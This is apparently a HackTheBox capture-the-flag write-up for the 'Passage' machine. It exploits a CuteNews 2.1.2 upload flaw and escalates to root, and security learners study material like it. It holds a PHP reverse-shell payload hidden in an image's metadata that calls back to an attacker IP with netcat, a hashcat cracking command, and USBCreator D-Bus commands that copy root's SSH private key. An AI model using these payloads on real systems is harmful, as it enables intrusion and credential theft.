---
title: "HackTheBox: Passage"
date: "2021-03-06"
author: frosty
categories:
  - "writeups"
tags:
  - "hackthebox"
---

![Image](assets/img/writeups/hackthebox/passage/image.png)

* * *

## Host Enumeration

As standard with HackTheBox, our approach is to identify services that are runnin gon the host. To do this, we'll perform a port scan with nmap, followed by a service version and script scans with the identified ports. We see that there are two ports open:

- 22: SSH (OpenSSH 7.2p2)
- 80: HTTP (Apache httpd 2.4.18 ((Ubuntu)))

![Image](assets/img/writeups/hackthebox/passage/image-1.png)

![Image](assets/img/writeups/hackthebox/passage/image-2.png)

* * *

### Enumeration - HTTP

Alright, let's jump right in to the HTTP server hosted on port 80. We see a news page, and some blog posts. The first one is interesting for us, it says that the administrator has implemented Fail2Ban. This means that it might be a bit tricky for us to perform enumeration scans, such as Gobuster.

But on the bottom of the page, we see a little note in the footer saying that the webserver is powered by [CuteNews](https://cutephp.com/).

![Image](assets/img/writeups/hackthebox/passage/image-3-1024x389.png)

Interestingly, when looking at the hyperlinks to the individual posts, we see that there is an id parameter to load content. e.g. `index.php?id=11`. This is a bit fishy, and to me seems like we might be able to get some LFI or SQL injection. Alas this was unsuccessful for me. We'll have to look at other paths.

![Image](assets/img/writeups/hackthebox/passage/image-4.png)

* * *

### CuteNews CMS

Anyways, perhaps we can try some other paths. With a little bit of luck and some educated guessing, we try to navigate to `10.10.10.206/CuteNews`. Nice! We get to see a login form. This might be the next step for us.

![Image](assets/img/writeups/hackthebox/passage/image-5.png)

We can either sign in with a valid account, or we can register. Let's try to register an account. I think that it is unlikely to brute force credentials because of the implemented Fail2Ban.

![Image](assets/img/writeups/hackthebox/passage/image-6.png)

Nice! it worked!

![Image](assets/img/writeups/hackthebox/passage/image-7-1024x453.png)

In the sign in form we already saw some nice information. We saw that it was version 2.1.2, and when performing a Google search we can find some exploits. We see that this version is vulnerable to **Remote Code Execution** ([RCE Exploit Here](https://www.exploit-db.com/exploits/48800)) as well as **Arbitrary File Upload** ([AFE Exploit Here](https://www.exploit-db.com/exploits/48458)) and unless the administrator has protected this vulnerability, we might be in with a chance here.

* * *

## Getting the Initial Shell

After a bit of exploit code review, and vulnerability research ([CVE](https://www.cvedetails.com/version/281289/Cutephp-Cutenews-2.1.2.html)), it seems that the exploit works by uploading a malicious file in place of your profile picture. With a bit of luck, we can get our shell soon. We'll try a manual method to see if we can understand what is happening under the hood of the exploits.

Let's try to use `exiftool` to place some PHP code in an image, which uses system calls for code execution. We verify with `strings` that the payload has been inserted to the image.

```
$ exiftool -Comment='<?php echo "<pre>"; system("rm -f /tmp/frosty; mknod /tmp/frosty p; /bin/sh 0</tmp/frosty | nc 10.10.14.111 1234 1>/tmp/frosty"); ?>' hack.png
```

![Image](assets/img/writeups/hackthebox/passage/image-8.png)

Alright, now it's time to upload the file, then we should hopefully get our shell.

![Image](assets/img/writeups/hackthebox/passage/image-9.png)

But wait! The next step is important. Intercept the POST request that you perform with "Save Changes" and then rename "hack.png" to "hack.php", in the highlighted location below. Also validate that you are uploading the correct malicious file by seeing your PHP code.

![Image](assets/img/writeups/hackthebox/passage/image-10-1024x651.png)

And hopefully it should work! I got a shell!

![Image](assets/img/writeups/hackthebox/passage/image-11.png)

Let's quickly [upgrade the tty shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Zsh
$ stty raw -echo; fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 30 columns 90
```

* * *

## Privilege Escalation

Alright the next part is a bit strange. Remember how we just exploited CuteNews, and the CuteNews website said that there is no database required? How is this? You may be asking yourself where the user credentials are stored which enables us to login. Great question! Let's find out together.

Finding the file took a bit of "brute force" enumeration for me; i.e. I searched many files / directories manually, in pursuit of some interesting file. Alas we see an interesting file: `/var/www/html/CuteNews/cdata/users/lines`

![Image](assets/img/writeups/hackthebox/passage/image-13.png)

In there we see some passwords, stored as base64.

![Image](assets/img/writeups/hackthebox/passage/image-14.png)

So let's try to extract all the base64 entries, and see what they mean. The longer base64 entries could be the more interesting ones with more information. Let's try this theory:

It seems that it is a JSON object.

![Image](assets/img/writeups/hackthebox/passage/image-15-1024x131.png)

Alright, in here I think that we have a hash, but it looks pretty long. They are indeed SHA-256 so I suppose that they are pretty secure. Anyways, it's possible that these hashes have been cracked already, or we can try it ourselves quickly with rockyou.txt and hashcat

```
hashcat -m 1400 hashdump /usr/share/wordlists/rockyou.txt
```

![Image](assets/img/writeups/hackthebox/passage/image-16-1024x672.png)

It seems that only one of the hashes could be cracked. The plaintext is `atlanta1`. When mapping back to the JSON objects, we see it was for the Paul user.

Incidentally, when looking at the /home folder, we see that there are two users; one of which is Paul :) This is good news for us.

![Image](assets/img/writeups/hackthebox/passage/image-12.png)

![Image](assets/img/writeups/hackthebox/passage/image-17.png)

* * *

## Privilege Escalation 2

Alright, we aren't root yet. Let's try some quick manual enumeration before we load some privilege escalation scripts in. It could be that we could get the answer without having to wait for the script to finish.

So I perform `sudo -l` but we do not have privileges for that. Alright, so we try to check if there might be .ssh keys, and it seems that there are!

![Image](assets/img/writeups/hackthebox/passage/image-18.png)

![Image](assets/img/writeups/hackthebox/passage/image-19.png)

Alright let's inspect the id\_rsa and id\_rsa.pub keys.

![Image](assets/img/writeups/hackthebox/passage/image-20.png)

Hm, that's interesting. The id\_rsa.pub has `nadav@passage.htb` at the end of it. Could it be that the key is a shared key??? Let's try it quickly.

Wow it really worked!

![Image](assets/img/writeups/hackthebox/passage/image-21.png)

* * *

## Privilege Escalation 3

When performing the `id` command and observing it in the screenshot above, we actually see that there are a number of groups. Interestingly we are part of the sudo group, but we don't know Nadav's password so we likely can't exploit anything yet.

Let's try running [LinPeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and see how far we get.

![Image](assets/img/writeups/hackthebox/passage/image-22.png)

In fact, the next step too me a bit of hunting. I don't think that LinPeas.SH showed the vulnerability. Eventually I went to inspect the `.viminfo` file. We see some interesting [USBCreator](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) things.

![Image](assets/img/writeups/hackthebox/passage/image-23.png)

Let's try to perform some exploit!

```
$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/exploit/a.txt /a.txt true
```

![Image](assets/img/writeups/hackthebox/passage/image-25-1024x145.png)

Nice! It worked. We wrote contents to /a.txt under root context.

The interesting thing is that we do not need root privilege to read the file - because of the 444 permissions. So let's try to copy the id\_rsa file of the root user

```
$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/exploit/id_rsa true
```

![Image](assets/img/writeups/hackthebox/passage/image-26-1024x554.png)

And we are root!
